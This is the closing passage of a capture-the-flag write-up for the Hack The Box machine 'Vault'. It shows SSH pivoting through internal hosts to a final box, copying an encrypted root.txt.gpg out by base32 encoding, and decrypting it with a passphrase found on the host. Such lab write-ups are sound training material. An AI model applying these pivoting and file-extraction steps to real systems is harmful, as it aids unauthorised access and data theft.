</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;[localhost]:2222 ([::1]:2222)&#39;</span> cant be established.
</span></span><span style="display:flex;"><span>ECDSA key fingerprint is SHA256:Wo70Zou+Hq5m/+G2vuKwUnJQ4Rwbzlqhq2e1JBdjEsg.
</span></span><span style="display:flex;"><span>Are you sure you want to <span style="color:#66d9ef">continue</span> connecting <span style="color:#f92672">(</span>yes/no<span style="color:#f92672">)</span>? yes
</span></span><span style="display:flex;"><span>Warning: Permanently added <span style="color:#e6db74">&#39;[localhost]:2222&#39;</span> <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span> to the list of known hosts.
</span></span><span style="display:flex;"><span>dave@localhosts password: 
</span></span><span style="display:flex;"><span>Welcome to Ubuntu 16.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-116-generic i686<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">96</span> packages can be updated.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">49</span> updates are security updates.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Last login: Mon Sep  <span style="color:#ae81ff">3</span> 16:48:00 <span style="color:#ae81ff">2018</span>
</span></span><span style="display:flex;"><span>dave@vault:~$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>dave<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>dave<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>dave<span style="color:#f92672">)</span>
</span></span></code></pre></div><h2 id="shell-as-dave-vault">Shell as dave (vault)</h2>
<blockquote>
<p>Another recap&hellip; we&rsquo;re currently in an SSH session as follows:
<code>Attacker Box --SSH as dave--&gt; Ubuntu (10.129.121.48) --SSH as dave--&gt; DNS (192.168.122.4) --SSH as dave--&gt; vault (localhost:2222)</code></p></blockquote>
<h3 id="decrypt-roottxtgpg">Decrypt root.txt.gpg</h3>
<p>The quickest way to get <code>root.txt.gpg</code> back to our machine for decryption would be to base64 encode it, and simply copy and paste it.  Unfortunately, <code>base64</code> isn&rsquo;t installed&hellip; but <code>base32</code> is.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>dave@vault:~$ base32 root.txt.gpg
</span></span><span style="display:flex;"><span>QUBAYA6HPDDBBUPLD4BQCEAAUCMOVUY2GZXH4SL5RXIOQQYVMY4TAUFOZE64YFASXVITKTD56JHD
</span></span><span style="display:flex;"><span>LIHBLW3OQMKSHQDUTH3R6QKT3MUYPL32DYMUVFHTWRVO5Q3YLSY2R4K3RUOYE5YKCP2PAX7S7OJB
</span></span><span style="display:flex;"><span>GMJKKZNW6AVN6WGQNV5FISANQDCYJI656WFAQCIIHXCQCTJXBEBHNHGQIMTF4UAQZXICNPCRCT55
</span></span><span style="display:flex;"><span>AUMRZJEQ2KSYK7C3MIIH7Z7MTYOXRBOHHG2XMUDFPUTD5UXFYGCWKJVOGGBJK56OPHE25OKUQCRG
</span></span><span style="display:flex;"><span>VEVINLLC3PZEIAF6KSLVSOLKZ5DWWU34FH36HGPRFSWRIJPRGS4TJOQC3ZSWTXYPORPUFWEHEDOE
</span></span><span style="display:flex;"><span>OPWHH42565HTDUZ6DPJUIX243DQ45HFPLMYTTUW4UVGBWZ4IVV33LYYIB32QO3ONOHPN5HRCYYFE
</span></span><span style="display:flex;"><span>CKYNUVSGMHZINOAPEIDO7RXRVBKMHASOS6WH5KOP2XIV4EGBJGM4E6ZSHXIWSG6EM6ODQHRWOAB3
</span></span><span style="display:flex;"><span>AGSLQ5ZHJBPDQ6LQ2PVUMJPWD2N32FSVCEAXP737LZ56TTDJNZN6J6OWZRTP6PBOERHXMQ3ZMYJI
</span></span><span style="display:flex;"><span>UWQF5GXGYOYAZ3MCF75KFJTQAU7D6FFWDBVQQJYQR6FNCH3M3Z5B4MXV7B3ZW4NX5UHZJ5STMCTD
</span></span><span style="display:flex;"><span>ZY6SPTKQT6G5VTCG6UWOMK3RYKMPA2YTPKVWVNMTC62Q4E6CZWQAPBFU7NM652O2DROUUPLSHYDZ
</span></span><span style="display:flex;"><span>6SZSO72GCDMASI2X3NGDCGRTHQSD5NVYENRSEJBBCWAZTVO33IIRZ5RLTBVR7R4LKKIBZOVUSW36
</span></span><span style="display:flex;"><span>G37M6PD5EZABOBCHNOQL2HV27MMSK3TSQJ4462INFAB6OS7XCSMBONZZ26EZJTC5P42BGMXHE274
</span></span><span style="display:flex;"><span>64GCANQCRUWO5MEZEFU2KVDHUZRMJ6ABNAEEVIH4SS65JXTGKYLE7ED4C3UV66ALCMC767DKJTBK
</span></span><span style="display:flex;"><span>TTAX3UIRVNBQMYRI7XY<span style="color:#f92672">=</span>
</span></span></code></pre></div><p>Now copy and paste that string into a file on the <code>ubuntu</code> box, <code>encoded-file</code> in my case.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>dave@ubuntu:~/Desktop$ base32 -d encoded-file &gt; root.txt.gpg
</span></span></code></pre></div><p>Now, remember that file on Dave&rsquo;s desktop titled <code>key</code>&hellip; it&rsquo;s contents are <code>itscominghome</code>. Let&rsquo;s try it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>dave@ubuntu:~/Desktop$ gpg -d root.txt.gpg 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>You need a passphrase to unlock the secret key <span style="color:#66d9ef">for</span>
</span></span><span style="display:flex;"><span>user: <span style="color:#e6db74">&#34;david &lt;dave@david.com&gt;&#34;</span>
</span></span><span style="display:flex;"><span>4096-bit RSA key, ID D1EB1F03, created 2018-07-24 <span style="color:#f92672">(</span>main key ID 0FDFBFE4<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;david &lt;dave@david.com&gt;&#34;</span>
</span></span><span style="display:flex;"><span>ca46837********************fe819
</span></span></code></pre></div>
  
  <hr>
<div class="footer">
    
	    
            <a class="previous-post" href="https://pL4sTiC1337.github.io/writeups/htb-popcorn/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>HtB Popcorn</a>
        
	    
            <div class="next-post">
                <a href="https://pL4sTiC1337.github.io/writeups/htb-sizzle/?ref=footer"><span style="font-weight:bold;">Next »</span><br>HtB Sizzle</a>
            </div>
        
    
</div>

  
</div>
            </main>
            
  
    <div class="article-toc ">
    <div class="toc-wrapper">
      <h4 id="contents"></h4>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#scanning">Scanning</a>
      <ul>
        <li><a href="#nmap">nmap</a></li>
        <li><a href="#http---80tcp">HTTP - 80/tcp</a></li>
      </ul>
    </li>
    <li><a href="#initial-access">Initial Access</a>
      <ul>
        <li><a href="#file-upload-sparklaysdesignchangelogophp">File Upload: /sparklays/design/changelogo.php</a></li>
      </ul>
    </li>
    <li><a href="#shell-as-www-data">Shell as www-data</a></li>
    <li><a href="#shell-as-dave">Shell as dave</a>
      <ul>
        <li><a href="#network-2">Network #2</a></li>
        <li><a href="#web-server-on-1921681224">Web Server on 192.168.122.4</a></li>
      </ul>
    </li>
    <li><a href="#shell-as-root-dns">Shell as root (DNS)</a>
      <ul>
        <li><a href="#enumeration">Enumeration</a></li>
        <li><a href="#clever-use-of-source-port">Clever Use of Source Port</a></li>
      </ul>
    </li>
    <li><a href="#shell-as-dave-vault">Shell as dave (vault)</a>
      <ul>
        <li><a href="#decrypt-roottxtgpg">Decrypt root.txt.gpg</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>
</div>

  

        </div>
    </body>
</html>
